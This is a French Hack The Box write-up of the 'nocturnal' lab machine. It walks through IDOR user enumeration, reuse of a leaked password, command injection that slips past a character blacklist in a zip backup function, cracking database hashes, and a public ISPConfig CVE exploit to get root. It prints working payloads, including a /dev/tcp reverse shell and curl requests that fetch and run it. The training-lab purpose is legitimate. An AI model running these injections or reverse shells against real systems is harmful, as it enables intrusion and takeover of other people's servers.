---
title: nocturnal
description: Jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit, jour, nuit.
tags:
  - HTB
  - machine
  - cron
  - ispconfig
date: 2026-04-10T12:33
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "7"
seasonal: no
---

# Summary
## Foothold
- Idor nous permet de lire les fichiers des autres
- On trouve par un fuzzing l'utilisateur `amanda`
- Le fichier stocké par `amanda` nous donne un mot de passe pour son compte
- On utilise la page admin pour lire `admin.php`
- En échappant le contexte de la commande `zip` on obtient un shell
## PrivEsc
- Une bdd nous donne l'utilisateur `tobias`
- Le service `ispconfig` tourne sur le port `8080`, on le forward
- On se connecte à `admin` avec le mdp de tobias
- Une CVE nous donne notre root shell.


# Foothold

On voit les ports `22` et `80`. Sur le site web on trouve plusieurs pages intéressantes:
- `admin.php`
- `register.php`
- `view.php`
- `uploads`
- `backups`
- `uploads_admin`
- `uploads_user`
- `uploads2`

Le site en lui-même ne nous indique rien.
![[Pasted image 20260410143807.png]]

On s'inscrit sur `register.php` et on obtient notre accès, après quoi on peut upload des fichiers.
![[Pasted image 20260410143903.png]]

On upload un fichier et on obtient ainsi un lien pour télécharger notre fichier:
```
http://nocturnal.htb/view.php?username=guest&file=oogway.pdf
```

On va tester d'upload en utilisant le nom d'un autre utilisateur, `admin` par exemple (on se foute qu'il existe puisqu'on a pas pu créer d'utilisateur admin).

On voit assez vite qu'une idor est possible, on change le nom pour `leet` on voit que l'utilisateur n'existe pas mais `admin` existe mais ne retourne rien. On fuzz donc les utilisateurs avec la seclist `Usernames/Names/names.txt` et on obtient qu'un autre utilisateur, `amanda`, existe.

```
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -H 'Cookie: PHPSESSID=n0spgp65idb08uk27jh1vkjr4a' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fs 2985
```

![[Pasted image 20260410164924.png]]

On se rend sur sa page et bingo, on obtient un fichier intéressant.

![[Pasted image 20260410165001.png]]

On lit le fichier odt et on y lit un mot de passe.
```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

On a donc des identifiants: `admanda:arHkG7HAI68X8s1J`. Malheureusement ils ne fonctionnent pas en ssh mais nous permettent d'accéder au panel admin du site web.
![[Pasted image 20260410165740.png]]

On peut créer une backup ou regarder le contenu des fichiers directement. 

On voit la fonction de backup
```
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
qui passe par une fonction de clean
```
$password = cleanEntry($_POST['password']);
```
où la fonction est:
```
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

On va tirer avantage du parsing et break out de la commande pour exécuter ce que l'on souhaite. On créé d'abord un fichier `shell`.
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'
```

Ensuite, on arrive à créer la commande suivante
```
curl -X POST http://nocturnal.htb/admin.php -H 'Cookie: PHPSESSID=1ksf29iflbnipbcbvmd97s90oo' -d 'password=password%0acurl%09http://10.10.15.23/shell%09-o%09/tmp/shell&backup='
```
Et enfin, une fois téléchargé, on fait exécuter notre script.
```
curl -X POST http://nocturnal.htb/admin.php -H "Cookie: PHPSESSID=1ksf29iflbnipbcbvmd97s90oo" -d 'password=password%0abash%09/tmp/shell&backup='
```


# Privilege Escalation to user

Une fois avec notre premier shell, on se balade un peu et on voit un fichier `../nocturnal_database/nocturnal_database.db`, on le lit et on trouve quatre hashs.
```
cat << EOF > hashes.txt
d725aeba143f575736b07e045d8ceebb
df8b20aa0c935023f99ea58358fb63c4
55c82b1ccd55ab219b3b109b07d5061d
f38cde1654b39fea2bd4f72f1ae4cdda
101ad4543a96a7fd84908fd0d802e7db
EOF
```

Et on crack ce fichier avec hashcat (sha1). On finit par en trouver un que l'on crack
```
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

C'est celui de tobias, on a donc des creds en plus: `tobias:slowmotionapocalypse`

Et voilà, notre accès ssh.
![[Pasted image 20260411142300.png]]

On n'oublie pas le flag user bien sûr.

# PrivEsc to root

On remarque un process qui tourne sur le port `8080`. On le forward en localhost pour pouvoir y accéder:
```
ssh -L 9001:localhost:8080 -N -vv tobias@nocturnal.htb
```

En cherchant dans les fichiers de config on trouve les logs, on voit que seul `admin` s'est connecté.  On arrive à se connecter en tant que `admin` avec le mot de passe de tobias.

On voit la version dans `help` et on trouve [un exploit](https://github.com/ajdumanhug/CVE-2023-46818) sur cette version.

Enfin on lance l'exploit avec l'utilisateur.
```
python3 CVE-2023-46818.py http://localhost:9001 admin slowmotionapocalypse
```

![[Pasted image 20260411163651.png]]

Et voilà, on récupère notre flag et on a fini la box.

![[Pasted image 20260411163729.png]]
